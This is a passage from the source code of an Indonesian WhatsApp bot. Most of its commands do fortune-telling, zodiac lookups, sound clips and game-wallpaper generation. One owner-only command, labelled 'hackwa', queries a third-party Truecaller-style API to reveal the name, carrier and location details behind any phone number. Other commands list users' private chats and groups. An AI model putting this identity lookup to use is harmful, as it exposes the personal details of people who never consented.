                tganz.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'afk': {
            if (isBan) return reply(mess.ban)
                let user = global.db.data.users[m.sender]
                user.afkTime = +new Date
                user.afkReason = text
                m.reply(`   ⌈ *INFO - AFK* ⌋\n\n*❑ Kᴀᴋᴀᴋ :* ⟨ ${m.pushName} ⟩ Tᴇʟᴀʜ AFK !!!\n*❑ Dᴇɴɢᴀɴ ᴀʟᴀsᴀɴ :* ${text ? '' + text : '*Tidak Diketahui 🤷*'}`)
            }
            break
            case 'peruntungan': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} TestGanz,7,7,2005,2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'weton': case 'wetonjawa': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 7,7,2005`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            case 'sifat': case 'karakter': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} TestGanz, 7,7,2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            break
            case 'keberuntungan': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} TestGanz, 7,7,2005`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 12,1,2022`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix + command} 12,1,2022,28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                tganz.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Contoh : ${prefix+ command} 7 7 2005`)
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
        let date = new Date(text)
     if (date == 'Invalid Date') throw date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])
                
let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return m.reply(anu.message)
tganz.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'trurcaller':
            case 'truecaler':
            case 'callerid':
            case 'hackwa':
            case 'tcall': {
            if (isBan) return reply(mess.ban)
            if (!isCreator) return reply(mess.owner)
            if(!text && !text.startsWith("+")) return m.reply(`Hᴀɪ ᴋᴀᴋ ᴍᴀɴᴀ ɴᴏᴍᴏʀ ʏᴀɴɢ ɪɴɢɪɴ ᴅɪ ʟᴀᴄᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} +628xxx*\n\n⫹⫺ Wᴀᴊɪʙ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ⟨ +62 ⟩ ᴊᴀɴɢᴀɴ ⟨ 62/08 ⟩ !!!`)
             await tganz.sendMessage(m.chat, { react: { text: `🔍`, key: m.key }})
             await tganz.sendMessage(m.chat, { react: { text: `📞`, key: m.key }})
            const api = await fetchJson(`https://outrageous-fish-dress.cyclic.app/api/other/truecaller?number=${args[0]}`)
const msg = `     ⌈ *IDENTITAS* ⌋

⫹⫺ Iɴғᴏ ɴᴏᴍᴏʀ ᴀᴋᴜɴ : ⟨ *${text}* ⟩
⊙══════════════════════⊙
*❑ Nᴀᴍᴀ Aᴋᴜɴ :* ⟨ ${api.data.data[0].name} ⟩
*❑ Sᴛᴀᴛᴜs Aᴋᴜɴ :* ${api.data.data[0].access}
*❑ Sᴋᴏʀ Aᴋᴜɴ :* ${api.data.data[0].score}
*❑ Fᴏʀᴍᴀᴛ E164 :* ${api.data.data[0].phones[0].e164Format}
*❑ Fᴏʀᴍᴀᴛ Nᴀsɪᴏɴᴀʟ :* ${api.data.data[0].phones[0].nationalFormat}
*❑ Aᴡᴀʟᴀɴ Nᴏᴍᴏʀ :* ${api.data.data[0].phones[0].dialingCode}
*❑ Kᴏᴅᴇ Nᴇɢᴀʀᴀ :* ${api.data.data[0].phones[0].countryCode}
*❑ Wᴀᴋᴛᴜ Dᴀᴇʀᴀʜ :* ${api.data.data[0].addresses[0].timeZone}
*❑ Pʀᴏᴠɪᴅᴇʀ :* ${api.data.data[0].phones[0].carrier}
*❑ Tɪᴘᴇ Tᴇʟᴇᴘᴏɴ :* ${api.data.data[0].phones[0].type}
⊙══════════════════════⊙

❑ Dᴀᴛᴀ ᴅɪ ᴀᴛᴀs ᴛᴇʀᴍᴀsᴜᴋ ᴅᴀᴛᴀ ʏᴀɴɢ sᴜᴅᴀʜ ᴛᴇʀᴋᴀɪᴛ ᴘᴀᴅᴀ ᴀᴋᴜɴ WʜᴀᴛsAᴘᴘ ɴᴏᴍᴏʀ ᴛᴇʀsᴇʙᴜᴛ !!!

*© ɦαcҡ ɓყ ƭεรƭɠαɳƶ ⸙*`
const truei = await m.reply(msg)
 await tganz.sendMessage(m.chat, { react: { text: `📋`, key: truei.key }})
 await tganz.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
            }
            break
            case 'listpc': {
            if (isBan) return reply(mess.ban)
            if (!isCreator) return reply(mess.owner)
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣           *[ Iɴғᴏʀᴍᴀsɪ Cʜᴀᴛ Pʀɪʙᴀᴅɪ ]*\n\n  *❑ Tᴏᴛᴀʟ Cʜᴀᴛ Pʀɪʙᴀᴅɪ :* ${anu.length} Cʜᴀᴛ/Kᴏɴᴛᴀᴋ\n`
                 let no = 1
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `\n╔════════⟨ *${no++}* ⟩════════⊙\n╠☞ *Nᴀᴍᴀ :* ${nama}\n╠☞ *Nᴏᴍᴏʀ WʜᴀᴛsAᴘᴘ :* @${i.split('@')[0]}\n╠☞ *Lɪɴᴋ Cᴇᴘᴀᴛ :* https://wa.me/${i.split('@')[0]}\n╚══════════════════⊙\n`
                 }
                 tganz.sendTextWithMentions(m.chat, teks, m)
             }
             break
              case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161': {
if (isBan) return reply(mess.ban)
m.reply(mess.wait)
didin_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await tganz.sendMessage(m.chat, { audio: didin_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m }) 
}
break
                case "cekidgrup":
                case "cekid":
                case "idgc":
                case "idgroup":
                case 'listgroup': 
                case 'listgrup': 
                case 'listgc': {
                if (isBan) return reply(mess.ban)
                if (!isCreator) return reply(mess.owner)
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣    *[ Iɴғᴏʀᴍᴀsɪ Cʜᴀᴛ Gʀᴜᴘ ]*\n\n  *❑ Tᴏᴛᴀʟ Cʜᴀᴛ Gʀᴜᴘ :* ${anu.length} Gʀᴜᴘ\n`
                 let no = 1
                 for (let i of anu) {
                 let metadata = await tganz.groupMetadata(i)
                 if (metadata.owner === "ᴛɪᴅᴀᴋ ᴅɪ ᴋᴇᴛᴀʜᴜɪ !") {
                 loldd = false
              } else {
                 loldd = metadata.owner
                  }
                teks += `\n╔════════⟨ *${no++}* ⟩════════⊙\n╠☞ *Nᴀᴍᴀ Gʀᴜᴘ :* ${metadata.subject ? metadata.subject : "ᴛɪᴅᴀᴋ ᴅɪ ᴋᴇᴛᴀʜᴜɪ !"}\n╠☞ *Pᴇɴᴄɪᴘᴛᴀ Gʀᴜᴘ :* ${loldd ? '@' + loldd.split("@")[0] : "ᴛɪᴅᴀᴋ ᴅɪ ᴋᴇᴛᴀʜᴜɪ !"}\n╠☞ *ID Gʀᴜᴘ :* ${metadata.id ? metadata.id : "ᴛɪᴅᴀᴋ ᴅɪ ᴋᴇᴛᴀʜᴜɪ !"}\n╠☞ *Gʀᴜᴘ Dɪ Bᴜᴀᴛ Pᴀᴅᴀ :* ${metadata.creation ? moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY') : "ᴛɪᴅᴀᴋ ᴅɪ ᴋᴇᴛᴀʜᴜɪ !"}\n╠☞ *Jᴀᴍ :* ${metadata.creation ? moment(metadata.creation * 1000).tz('Asia/Jakarta').format('HH:mm:ss') : "ᴛɪᴅᴀᴋ ᴅɪ ᴋᴇᴛᴀʜᴜɪ !"} WIB\n╠☞ *Jᴜᴍʟᴀʜ Mᴇᴍʙᴇʀ :* ${metadata.participants.length ? metadata.participants.length : "ᴛɪᴅᴀᴋ ᴅɪ ᴋᴇᴛᴀʜᴜɪ !"}\n╚══════════════════⊙\n`
}
tganz.sendTextWithMentions(m.chat, teks, m)
}
break
            case 'overwatchwallpaper': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|lucio`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|character\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|lucio`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['ana', 'ashe', 'ashe-2', 'baptiste', 'baptiste-2', 'brigitte', 'dva', 'dva-2', 'genji', 'hanzo', 'junkrat', 'lucio', 'nccree', 'nei', 'nercy', 'nercy-2', 'nercy-3', 'noira', 'pharah', 'reaper', 'roadhog', 'soldier-76', 'sombra', 'sombra-2', 'symmetra', 'tracer', 'tracer-2', 'widowmaker', 'widowmaker-2', 'zarya']
                if (!style.includes(m2)) {
                    getStyle(style.length, "character")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        character: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'listnyimak':
            case 'listonline':
            case 'listonlen': {
            if (isBan) return reply(mess.ban)
            if (!m.isGroup) return reply(mess.group)
            let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                let online = [...Object.keys(store.presences[id]), botNumber]
                tganz.sendText(m.chat, '╔══✪〘 *Mᴇᴍʙᴇʀ - Aᴋᴛɪғ* 〙✪═══\n' + online.map(v => '╠➥ @' + v.replace(/@.+/, '')).join`\n`, m, {
                    mentions: online
                })
            }
            break
            case 'rovwallpaperhd': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|hero\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|keera`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|hero\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|keera`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['alice-5', 'arthur-8', 'dirak-3', 'errol', 'grakk-6', 'keera', 'lorion', 'nina-6', 'tulen-10', 'yena', 'zip-3', 'zuka-9', 'arum-6', 'baldum-3', 'elandorr-3', 'hayate-5', 'ilumia-5', 'ishar-4', 'lauriel-8', 'nax-5', 'nurad-9', 'quillen-6', 'teemee-3', 'telannas-8', 'yena-4', 'yena-5', 'butterfly-10', 'laville', 'laville-2', 'nakroth-7', 'omen-6', 'rouie-2', 'taara-5', 'zanis-8', 'zata', 'zata-2', 'capheny-4', 'elsu-6', 'fennik-5', 'liliana-7', 'paine', 'paine-2', 'rouie', 'astrid-4', 'ata', 'ata-2', 'lauriel-8', 'omen-5', 'qi-3', 'roxie-5', 'taara-5', 'violet-12', 'wukong-7', 'wukong-8', 'hayate-4', 'ishar-3', 'jinna-5', 'lauriel-7', 'quillen-5', 'richter-4', 'ryoma-6', 'telannas-8', 'tulen-9', 'yorn-7', 'aleister-4', 'dirak', 'dirak-2', 'grakk-5', 'kerra', 'raz-4', 'athur-7', 'arum-5', 'ishar-2', 'nax-4', 'natalya-7', 'valhein-7', 'zill-5', 'diaochan-6', 'ignis-4', 'lubu-8', 'naloch-7', 'sephera-4', 'elandorr', 'elandorr-2', 'krizzix', 'krizzix-2', 'violet-11', 'yena-3', 'arduin-4', 'enzo-3', 'errol-3', 'hayate-3', 'krixi-7', 'nurad-8', 'volkath', 'volkath-2', 'wisp-4', 'wukong-6', 'gildur-4', 'ishar', 'nurad-7', 'quillen-4', 'tulen-8', 'lauriel-6', 'qi', 'qi-2', 'darcy-3', 'florentino-3', 'noren-3', 'ryoma-5', 'sephera-3', 'annette-4', 'capheny-3', 'elsu-5', 'narja-3', 'veres-3', 'violet-10', 'zip-2', 'zip-3', 'diaochan-5', 'enzo-2', 'lubu-7', 'payna-4', 'roxie-4', 'violet-9', 'zanis-7', 'zephys-6', 'enzo', 'liliana-6', 'lindis-5', 'xeniel-5', 'airi-9', 'errol-2', 'yena-2', 'zuka-8', 'zephys-3', 'zephys-2', 'zephys', 'zanis-5', 'zanis-4', 'zanis-3', 'zanis-2', 'zanis', 'violet-5', 'violet-4', 'violet-3', 'violet-2', 'violet', 'veera-4', 'veera-3', 'veera-2', 'valhein-3', 'valhein-2', 'valhein', 'thane-2', 'thane', 'nina-3', 'nina-2', 'nina', 'nganga-2', 'nganga', 'lubu-5', 'lubu-4', 'lubu-3', 'lubu-2', 'lubu', 'krixi-5', 'krixi-4', 'krixi-3', 'krixi-2', 'krixi', 'kahlii-3', 'kahlii-2', 'kahlii', 'diaochan-3', 'diaochan-2', 'diaochan', 'chaugnar', 'butterfly-5', 'butterfly-4', 'butterfly-2', 'butterfly', 'yorn-4', 'yorn-3', 'yorn-2', 'yorn', 'wukong-3', 'wukong-2', 'wukong', 'toro-2', 'toro', 'taara-2', 'taara', 'slimz-3', 'slimz-2', 'slimz', 'payna-2', 'payna', 'ormarr-4', 'ormarr-3', 'ormarr-2', 'kaisa-2', 'ormarr', 'natalya-5', 'natalya-4', 'natalya-3', 'natalya-2', 'natalya', 'nakroth-4', 'nakroth-3', 'nakroth-2', 'nakroth', 'naloch-3', 'naloch-2', 'naloch', 'lumburr', 'kriknak-2', 'kriknak', 'jinna-2', 'jinna', 'grakk-3', 'grakk-2', 'grakk', 'gildur-2', 'gildur', 'fennik-4', 'fennik-3', 'fennik-2', 'fennik', 'cresht', 'azzenka-2', 'azzenka', 'arthur-3', 'arthur-2', 'arthur', 'alice-2', 'alice', 'aleister-2', 'aleister', 'zuka-2', 'zuka', 'zill-2', 'zill', 'xeniel-2', 'xeniel', 'wonderwoman-2', 'wonderwoman', 'telannas-4', 'telannas-3', 'telannas-2', 'telannas', 'superman-2', 'superman', 'skud-2', 'skud', 'ryoma-2', 'ryoma', 'preyta-3', 'preyta-2', 'preyta', 'nurad-3', 'nurad-2', 'nurad', 'noren-2', 'noren', 'lauriel-4', 'lauriel-3', 'lauriel-2', 'lauriel', 'kilgroth-2', 'kilgroth', 'joker', 'illumia-3', 'illumia-2', 'illumia', 'ignis-2', 'ignis', 'batman-2', 'batman', 'astrid-2', 'astrid', 'arduin-2', 'arduin', 'airi-5', 'airi-4', 'airi-3', 'airi-2', 'airi', 'teemee-2', 'teemee', 'zuka-3', 'tulen', 'raz-2', 'raz', 'naloch-4', 'lumburr-2', 'lindis-2', 'joker-2', 'grakk-4', 'gildur-3', 'toro-3', 'omen-2', 'omen', 'zuka-4', 'tulen-2', 'nakroth-5', 'nax', 'liliana', 'zill-3', 'raz-3', 'liliana-2', 'tulen-3', 'telannas-5', 'taara-3', 'ryoma-3', 'nax-2', 'kriknak-3', 'flash', 'cresht-3', 'cresht-2', 'arthur-4', 'aleister-3', 'airi-6', 'arum-2', 'arum', 'wisp-2', 'wisp', 'rourke-2', 'rourke', 'narja-2', 'narja', 'butterfly-6', 'batman-3', 'astris-3', 'jinna-3', 'butterfly-7', 'arthur-5', 'valhein-4', 'superman-3', 'liliana-3', 'kilgroth-3', 'roxie-2', 'roxie', 'wukong-4', 'baldum-2', 'baldum', 'zephys-4', 'annette-2', 'annette', 'alice-3', 'telannas6', 'raz-4', 'nurad-6', 'nurad-5', 'jinna-4', 'amily', 'ybneth-2', 'ybneth', 'ilumia-4', 'amily-2', 'xeniel-3', 'veera-5', 'liliana4', 'flash-2', 'arthur-6', 'omen-3', 'lindis-3', 'elsu-2', 'elsu', 'richter-2', 'richter', 'nina-4', 'wirosableng', 'thane-3', 'ryoma-4', 'quillen-2', 'quillen', 'lauriel-5', 'arum-3', 'wisp-3', 'violet-7', 'sephera-2', 'sephera', 'naloch-5', 'krixi-6', 'alice-4', 'tulen-5', 'skud-3', 'rourke-3', 'nakroth-6', 'florentino-2', 'florentino', 'elsu-3', 'butterfly-8', 'amily-3', 'zuka-7', 'zuka-6', 'yorn-6', 'yorn-5', 'veres-2', 'veres', 'naloch-6', 'cresht-4', 'azzenka-3', 'airi-7', 'zephys-5', 'yorn-7', 'violet-8', 'valhein-5', 'tulen-6', 'thane-4', 'roxie-3', 'nakroth-7', 'kahlii-4', 'elsu-4', 'darcy-2', 'darcy', 'capheny', 'zill-4', 'hayate-2', 'hayate', 'cresht-5', 'annette-3', 'amily-4', 'tulen-7', 'telannas-7', 'omen-4', 'lindis-4', 'liliana-5', 'ignis-3', 'errol', 'capheny-2', 'arum-4', 'zanis-6', 'wukong-5', 'thane-5', 'slimz-4', 'skud-4', 'richter-3', 'quillen-3', 'azzenka-4', 'arduin-3', 'airi-8']
                if (!style.includes(m2)) {
                    getStyle(style.length, "hero")
                }
                else {
                    reply(mess.wait)
                    let textpro2 = await fetch(api('alfa', '/api/ephoto360/' + command, {
                        text: m1,
                        hero: m2
                    }, 'apikey'))
                    if (!textpro2.ok) throw await textpro2.text()
                    let img = await textpro2.buffer()
                    tganz.sendFile(m.chat, img, 'ephoto360.jpg', mess.done, m)
                }
            }
            break
            case 'rovwallpaper': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|avatar\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|grakk-6`)
                if (!text.includes('|')) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} teks|avatar\n\nCᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n${prefix+command} TᴇsᴛGᴀɴᴢ|grakk-6`)
                var mon = args.join(' ')
                var m1 = mon.split("|")[0]
                var m2 = mon.split("|")[1]
                const style = ['alice-5', 'arthur-8', 'dirak-3', 'errol', 'grakk-6', 'keera-2', 'lorion', 'grakk-6', 'keera-2', 'lorion', 'nina-6', 'tulen-10', 'yena', 'zip-3', 'zuka-9', 'dextra', 'dextra-2', 'lindis-6', 'nurad-10', 'nakroth-9', 'quillen-7', 'sephera-5', 'yorn-8', 'airi-10', 'amily-6', 'astrid-6', 'ata-3', 'capheny-5', 'darcy-4', 'diaochan-8', 'hayate-6', 'lauriel-10', 'laville-3', 'rourke-4', 'ryoma-7', 'sinestrea', 'sinestrea-2', 'telannas-9', 'thorne', 'thorne-2', 'veres-4', 'yena-6', 'zephys-7', 'allain', 'allain-2', 'butterfly-12', 'kahlii-6', 'nakroth-8', 'preyta-4', 'taara-7', 'valhein-8', 'arum-6', 'baldum-3', 'elandorr-3', 'hayate-5', 'ilumia-5', 'ishar-4', 'lauriel-8', 'nax-5', 'nurad-9', 'quillen-6', 'teemee-3', 'telannas-8', 'yena-4', 'yena-5', 'butterfly-10', 'laville', 'laville-2', 'nakroth-7', 'omen-6', 'rouie-2', 'taara-6', 'zanis-8', 'zata', 'zata-2', 'capheny-4', 'elsu-6', 'fennik-5', 'liliana-7', 'paine', 'paine-2', 'rouie', 'astrid-4', 'ata', 'ata-2', 'lauriel-8', 'omen-5', 'qi-3', 'taara-5', 'violet-12', 'wukong-7', 'wukong-8', 'hayate-4', 'ishar-3', 'jinna-5', 'kerra-2', 'lauriel-7', 'quillen-5', 'richter-4', 'ryoma-6', 'telannas-8', 'tulen-9', 'yorn-7', 'aleister-4', 'dirak', 'dirak-2', 'grakk-5', 'keera', 'raz-4', 'ishar-2', 'nax-4', 'valhein-7', 'zill-5', 'arthur-7', 'rum-5', 'lubu-8', 'naloch-7', 'sephera-4', 'diaochan-6', 'ignis-4', 'elandorr', 'elandorr-2', 'krizzix', 'krizzix-2', 'violet-11', 'yena-3', 'arduin-4', 'enzo-3', 'errol-3', 'hayate-3', 'nurad-8', 'volkath', 'volkath-2', 'wisp-4', 'wukong-6', 'celica', 'gildur-4', 'ishar', 'nurad-7', 'quillen-4', 'tulen-8', 'qi', 'qi-2', 'darcy-3', 'florentino-3', 'noren-3', 'ryoma-5', 'sephera-3', 'elsu-5', 'narja-3', 'annette-4', 'capheny-3', 'veres-3', 'zip-2', 'zip', 'diaochan-5', 'enzo-2', 'lubu-7', 'payna-3', 'roxie-4', 'violet-9', 'zanis-7', 'zephys-6', 'enzo', 'liliana-6', 'lindis-5', 'xeniel-5', 'errol', 'yena-2', 'zuka-8', 'valhein', 'violet', 'airi', 'skud', 'zanis', 'zephis', 'butterfly', 'wukong', 'taara', 'nakroth', 'prayta', 'yorn', 'natalya', 'thane', 'toro', 'ormarr', 'omega', 'nina', 'nganga', 'lubu2', 'lubu', 'kahlii-2', 'kahlii', 'fennik-2', 'fennik', 'diaochan', 'cresht', 'azzenka', 'aleister', 'zuka2', 'zuka', 'payna-2', 'payna', 'nakroth-2', 'nortos-2', 'nortos', 'kriknak', 'jinna-2', 'jinna', 'batman', 'airi-2', 'violet-3', 'violet-2', 'skud-2', 'raz-2', 'raz', 'ignis-2', 'ignis', 'gildur', 'butterfly-4', 'butterfly-3', 'zanis-2', 'nurad', 'yorn-2', 'slimz', 'ormarr-2', 'nurad-2', 'nina-2', 'lauriel-2', 'grakk-2', 'grakk', 'diaochan-2', 'airi-3', 'zill-2', 'zill', 'zanis-3', 'yorn-3', 'veera-3', 'veera-2', 'thane-2', 'telannas', 'superman', 'naloch-2', 'krixi-3', 'butterfly-5', 'violet-5', 'veera-4', 'telannas-2', 'taara-2', 'joker', 'ilumia-2', 'batman-2', 'arduin-2', 'arduin', 'wukong-2', 'nakroth-3', 'ilumia-3', 'arthur', 'ryoma-2', 'ryoma', 'astrid-2', 'astrid', 'zephis-2', 'natalya-3', 'natalya-2', 'ubu-3', 'chaugnar', 'azzenka-2', 'zanis-4', 'wukong-3', 'noren', 'lubu-4', 'lauriel-3', 'aleister-2', 'nurad-3', 'noren-2', 'lubu-5', 'kilgroth', 'gildur-2', 'fennik-3', 'lauriel-4', 'zephys-3', 'xeniel-2', 'wonderwomen', 'superman-2', 'slimz-2', 'natalya-4', 'krixi-5', 'krixi-4', 'zanis-5', 'yorn-4', 